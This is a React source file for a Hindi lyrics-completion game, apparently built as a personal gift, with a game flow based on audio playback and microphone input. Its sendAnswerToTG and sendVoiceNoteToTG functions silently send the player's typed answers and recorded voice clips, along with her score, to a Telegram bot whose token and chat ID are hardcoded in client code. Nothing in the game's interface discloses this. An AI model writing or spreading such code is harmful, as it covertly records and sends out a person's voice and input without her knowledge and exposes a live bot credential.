"use client"

import { useState, useEffect, useCallback, useRef } from "react"
import { motion, AnimatePresence } from "framer-motion" // Agar tum motion/react use kar rahe ho toh yahan change kar lena
import { 
    ArrowRight, RotateCcw, Trophy, ChevronRight, Brain, Music2, Palette, 
    Sparkles, Heart, Star, Moon, Droplet, Zap, Gem, Flame, Sun, 
    Play, Mic, MicOff, Send, Music, CheckCircle 
} from "lucide-react"

// ⚠️ TUMHARI DETAILS
const BOT_TOKEN = "8673978157:AAFWiYR__xUFb79u9Tfrz-8guCB10sgruX0"
const CHAT_ID = "8745839603"

async function sendScore(gameName, score) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: `🎮 ${gameName}\n🏆 Final Score: ${score}` }),
        })
    } catch { }
}

async function sendAnswerToTG(songNo, expected, actual) {
    const text = `🎤 <b>Lyrics Challenge - Song ${songNo}</b>\n\n🎯 <b>Real Answer:</b> ${expected}\n🗣️ <b>She Typed/Said:</b> ${actual || "[Sirf voice bheji ya kuch nahi bola]"}`
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "HTML" }),
        })
    } catch { }
}

async function sendVoiceNoteToTG(songNo, expected, audioBlob) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`
    const formData = new FormData()
    formData.append("chat_id", CHAT_ID)
    formData.append("voice", audioBlob, "answer.ogg")
    formData.append("caption", `🎤 Song ${songNo} Voice Answer!\n🎯 Real: ${expected}`)
    
    try {
        await fetch(url, { method: "POST", body: formData })
    } catch (e) { console.error("Voice send error:", e) }
}

function playTone(freq, dur, type = "sine", vol = 0.2) {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)()
        const o = ctx.createOscillator(), g = ctx.createGain()
        o.connect(g); g.connect(ctx.destination)
        o.frequency.value = freq; o.type = type
        g.gain.setValueAtTime(vol, ctx.currentTime)
        g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + dur)
        o.start(); o.stop(ctx.currentTime + dur)
    } catch { }
}

const sfx = {
    flip: () => playTone(440, 0.08, "sine", 0.12),
    match: () => { [523, 659, 784].forEach((f, i) => setTimeout(() => playTone(f, 0.15, "sine", 0.2), i * 100)) },
    wrong: () => playTone(180, 0.25, "sawtooth", 0.15),
    correct: () => { playTone(880, 0.1, "sine", 0.18); setTimeout(() => playTone(1108, 0.15, "sine", 0.18), 80) },
    win: () => { [523, 659, 784, 1046].forEach((f, i) => setTimeout(() => playTone(f, 0.22, "sine", 0.22), i * 100)) },
}

function vibrate() { if (navigator?.vibrate) navigator.vibrate([60, 30, 60]) }

function GlowIcon({ children, color = "#ec4899", size = 40 }) {
    return (
        <div style={{
            width: size, height: size, borderRadius: "50%",
            border: `2px solid ${color}`,
            boxShadow: `0 0 12px ${color}60, inset 0 0 8px ${color}20`,
            display: "flex", alignItems: "center", justifyContent: "center",
            background: `${color}10`,
        }}>
            {children}
        </div>
    )
}

// ============================================
// LYRICS GAME 
// ============================================
const songsData = [
    { id: 1, songStart: 12, pausePoint: 10, answerReveal: 15, answer: "यूं मुस्कुराए" },
    { id: 2, songStart: 16, pausePoint: 17, answerReveal: 22, answer: "तुमने ना जाने क्या सपने" },
    { id: 3, songStart: 28, pausePoint: 25, answerReveal: 30, answer: "यारा मैं क्या करूं?" },
    { id: 4, songStart: 42, pausePoint: 46, answerReveal: 51, answer: "दिल में कहीं तुम छुपा लो" },
    { id: 5, songStart: 57, pausePoint: 56, answerReveal: 61, answer: "तू मीठे घाट का पानी" },
    { id: 6, songStart: 113, pausePoint: 117, answerReveal: 122, answer: "नया प्यार है, नया इंतजार" },
    { id: 7, songStart: 128, pausePoint: 135, answerReveal: 140, answer: "अब तुम ही हो" },
    { id: 8, songStart: 144, pausePoint: 148, answerReveal: 153, answer: "प्यार होता है दीवाना सनम" },
    { id: 9, songStart: 159, pausePoint: 197, answerReveal: 202, answer: "एक पल" },
    { id: 10, songStart: 208, pausePoint: 209, answerReveal: 214, answer: "तुम चाह कायनात में नहीं है कहीं" },
    { id: 11, songStart: 230, pausePoint: 232, answerReveal: 237, answer: "अजब सी अजब सी अदाएं हैं" },
    { id: 12, songStart: 243, pausePoint: 247, answerReveal: 252, answer: "नजर नहीं चुराना सनम" },
    { id: 13, songStart: 258, pausePoint: 302, answerReveal: 307, answer: "जरा सा अपना ले बना" },
    { id: 14, songStart: 314, pausePoint: 318, answerReveal: 323, answer: "पहली दफा है बल्ला" },
    { id: 15, songStart: 329, pausePoint: 328, answerReveal: 333, answer: "लब से आ मन्नत पूरी तुमसे ही" },
    { id: 16, songStart: 344, pausePoint: 347, answerReveal: 352, answer: "मेरी बातों में तू है" },
    { id: 17, songStart: 358, pausePoint: 397, answerReveal: 402, answer: "बस आया हूं तेरे पास रे" },
    { id: 18, songStart: 413, pausePoint: 418, answerReveal: 423, answer: "पहले से ज्यादा तू पे मरने" },
    { id: 19, songStart: 428, pausePoint: 433, answerReveal: 438, answer: "छांव है कभी कभी है धूप" },
    { id: 20, songStart: 444, pausePoint: 449, answerReveal: 454, answer: "ती है" },
    { id: 21, songStart: 459, pausePoint: 458, answerReveal: 503, answer: "ये मीना रे" },
    { id: 22, songStart: 514, pausePoint: 518, answerReveal: 523, answer: "चांद जलने लगा" },
    { id: 23, songStart: 529, pausePoint: 534, answerReveal: 539, answer: "शाम आती है" },
    { id: 24, songStart: 545, pausePoint: 548, answerReveal: 553, answer: "तो मैं आ गया" },
    { id: 25, songStart: 559, pausePoint: 556, answerReveal: 601, answer: "माया" },
    { id: 26, songStart: 608, pausePoint: 609, answerReveal: 614, answer: "मोह मोह के धागे" },
    { id: 27, songStart: 623, pausePoint: 624, answerReveal: 629, answer: "तुमसे मिलके दिल का है जो हाल क्या कहें" },
    { id: 28, songStart: 639, pausePoint: 640, answerReveal: 645, answer: "हो गया है कैसा ये कमाल क्या कहें" },
    { id: 29, songStart: 645, pausePoint: 644, answerReveal: 654, answer: "तेरे सपनों में नाराज़" },
    { id: 30, songStart: 700, pausePoint: 705, answerReveal: 710, answer: "दिल दिया गए" },
    { id: 31, songStart: 716, pausePoint: 712, answerReveal: 717, answer: "ही नहीं" },
    { id: 32, songStart: 725, pausePoint: 726, answerReveal: 731, answer: "मन साहिब जी जाने है" },
    { id: 33, songStart: 735, pausePoint: 735, answerReveal: 740, answer: "फिर भी बनाए बहाने" },
    { id: 34, songStart: 746, pausePoint: 751, answerReveal: 756, answer: "कसम तुम्हें कसम आ के मिलना" },
    { id: 35, songStart: 802, pausePoint: 807, answerReveal: 812, answer: "मुझको भावे गलियां तेरी" }
];

function LyricsGame({ onScore }) {
    const [selectedSongs] = useState(() => [...songsData].sort(() => 0.5 - Math.random()).slice(0, 5))
    const [currentIdx, setCurrentIdx] = useState(0)
    const [gameState, setGameState] = useState("idle")
    const [userAnswer, setUserAnswer] = useState("")
    const [isRecording, setIsRecording] = useState(false)
    const [score, setScore] = useState(0)
    const [voiceBlob, setVoiceBlob] = useState(null)

    const audioRef = useRef(null)
    const recognitionRef = useRef(null)
    const mediaRecorderRef = useRef(null)
    const audioChunksRef = useRef([])

    const currentSong = selectedSongs[currentIdx]
    const actualPausePoint = currentSong ? (currentSong.pausePoint > currentSong.songStart ? currentSong.pausePoint : currentSong.answerReveal - 4) : 0;

    useEffect(() => {
        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition
        if (SpeechRecognition) {
            recognitionRef.current = new SpeechRecognition()
            recognitionRef.current.lang = 'hi-IN'
            recognitionRef.current.continuous = false
            recognitionRef.current.onresult = (e) => {
                setUserAnswer(e.results[0][0].transcript)
            }
        }
    }, [])

    useEffect(() => {
        const audio = audioRef.current
        if (!audio) return

        const handleTimeUpdate = () => {
            const time = audio.currentTime
            const song = selectedSongs[currentIdx]
            
            if (gameState === "playing" && time >= actualPausePoint) {
                audio.pause()
                setGameState("answering")
            }
            
            if (gameState === "revealing" && time >= song.answerReveal + 2) {
                audio.pause()
            }
        }

        audio.addEventListener("timeupdate", handleTimeUpdate)
        return () => audio.removeEventListener("timeupdate", handleTimeUpdate)
    }, [currentIdx, gameState, selectedSongs, actualPausePoint])

    const toggleMic = async () => {
        if (isRecording) {
            if (mediaRecorderRef.current) mediaRecorderRef.current.stop()
            if (recognitionRef.current) { try { recognitionRef.current.stop() } catch (e) {} }
            setIsRecording(false)
        } else {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true })
                const mr = new MediaRecorder(stream)
                mediaRecorderRef.current = mr
                audioChunksRef.current = []

                mr.ondataavailable = (e) => {
                    if (e.data.size > 0) audioChunksRef.current.push(e.data)
                }

                mr.onstop = () => {
                    const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
                    setVoiceBlob(blob)
                    stream.getTracks().forEach(t => t.stop())
                }

                mr.start()
                setVoiceBlob(null)
                setUserAnswer("")
                setIsRecording(true)

                if (recognitionRef.current) { try { recognitionRef.current.start() } catch (e) {} }
            } catch (err) {
                alert("Microphone access denied! 📝")
            }
        }
    }

    const handleStartGame = () => {
        setGameState("playing")
        audioRef.current.currentTime = selectedSongs[0].songStart
        audioRef.current.play()
    }

    const checkAnswer = async () => {
        if (isRecording) {
            if (mediaRecorderRef.current) mediaRecorderRef.current.stop()
            if (recognitionRef.current) { try { recognitionRef.current.stop() } catch(e){} }
            setIsRecording(false)
        }

        const newScore = score + 20
        setScore(newScore)
        setGameState("revealing")
        
        audioRef.current.currentTime = actualPausePoint
        audioRef.current.play()

        setTimeout(async () => {
            await sendAnswerToTG(currentIdx + 1, selectedSongs[currentIdx].answer, userAnswer)
            const currentBlob = voiceBlob || (audioChunksRef.current.length > 0 ? new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" }) : null)
            if (currentBlob) {
                await sendVoiceNoteToTG(currentIdx + 1, selectedSongs[currentIdx].answer, currentBlob)
            }
        }, 500)
    }

    const nextSong = () => {
        setVoiceBlob(null)
        setUserAnswer("")
        if (currentIdx < selectedSongs.length - 1) {
            const nextIdx = currentIdx + 1
            setCurrentIdx(nextIdx)
            setGameState("playing")
            audioRef.current.currentTime = selectedSongs[nextIdx].songStart
            audioRef.current.play()
        } else {
            setGameState("finished")
            sfx.win()
            sendScore("Lyrics Challenge", score)
            onScore(score)
        }
    }

    if (gameState === "finished") {
        return (
            <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="text-center space-y-3 w-full">
                <p className="text-white font-bold text-xl">Challenge Complete!</p>
                <p className="text-pink-400 text-3xl font-bold">{score} pts</p>
                <p className="text-purple-300 text-sm">Hope you enjoyed the songs ✨</p>
            </motion.div>
        )
    }

    return (
        <motion.div className="flex flex-col items-center gap-4 w-full max-w-sm">
            <audio ref={audioRef} src="/images/song.mp3" />

            <div className="w-full flex justify-between text-xs mb-1">
                <span className="text-purple-400 font-bold">Lyrics Challenge</span>
                <span className="text-purple-400">Song {currentIdx + 1}/{selectedSongs.length}</span>
            </div>

            <div className="w-full rounded-2xl p-6 text-center backdrop-blur-sm relative overflow-hidden" 
                 style={{ background: "rgba(15,5,30,0.7)", border: "1px solid rgba(139,92,246,0.3)" }}>
                
                <AnimatePresence mode="wait">
                    {gameState === "idle" && (
                        <motion.div key="idle" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                            <div className="w-16 h-16 bg-pink-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                                <Play className="w-8 h-8 text-pink-400 ml-1" />
                            </div>
                            <p className="text-white text-sm mb-4 font-['Nunito']">Listen and complete the lyrics!</p>
                            <button onClick={handleStartGame} className="py-2 px-6 bg-gradient-to-r from-pink-500 to-purple-500 rounded-full text-white font-bold text-sm">
                                START
                            </button>
                        </motion.div>
                    )}

                    {gameState === "playing" && (
                        <motion.div key="playing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                            <motion.div animate={{ rotate: 360 }} transition={{ duration: 6, repeat: Infinity, ease: "linear" }}>
                                <div className="w-20 h-20 rounded-full border-2 border-dashed border-pink-400/40 flex items-center justify-center mx-auto mb-4">
                                    <Music2 className="w-8 h-8 text-pink-400" />
                                </div>
                            </motion.div>
                            <p className="text-pink-300 font-bold animate-pulse font-['Nunito']">Playing...</p>
                        </motion.div>
                    )}

                    {gameState === "answering" && (
                        <motion.div key="answering" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
                            <p className="text-white font-bold mb-4 font-['Nunito']">What's next?</p>
                            <div className="flex items-center gap-2 mb-4">
                                <input 
                                    type="text" 
                                    value={userAnswer} 
                                    onChange={(e) => setUserAnswer(e.target.value)}
                                    placeholder="Sing or type..."
                                    className="flex-1 bg-white/10 border border-white/20 rounded-full px-4 py-2 text-white text-sm outline-none focus:border-pink-500"
                                />
                                <button 
                                    onClick={toggleMic}
                                    className={`w-10 h-10 rounded-full flex items-center justify-center shrink-0 ${isRecording ? 'bg-red-500 animate-pulse' : 'bg-purple-500'}`}
                                >
                                    {isRecording ? <MicOff size={16} color="#fff" /> : <Mic size={16} color="#fff" />}
                                </button>
                            </div>
                            <button onClick={checkAnswer} className="w-full py-2 bg-gradient-to-r from-pink-500 to-purple-500 rounded-full text-white font-bold flex items-center justify-center gap-2">
                                Submit <Send size={14} />
                            </button>
                        </motion.div>
                    )}

                    {gameState === "revealing" && (
                        <motion.div key="revealing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
                            <div className="w-16 h-16 bg-purple-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                                <Music className="w-8 h-8 text-purple-400 animate-pulse" />
                            </div>
                            <p className="text-white/50 text-xs mb-1 font-['Nunito']">Actual Lyrics:</p>
                            <p className="text-white font-bold mb-6 text-lg font-['Nunito']">"{selectedSongs[currentIdx].answer}"</p>
                            <button onClick={nextSong} className="py-2 px-6 border border-white/20 rounded-full text-white font-bold text-sm hover:bg-white/10">
                                NEXT
                            </button>
                        </motion.div>
                    )}
                </AnimatePresence>
            </div>
        </motion.div>
    )
}

// Memory Match aur Color Match components niche same rahenge...
// (Bas FunGames export me Memory Match aur Color Match ka logic waise hi rakhna)
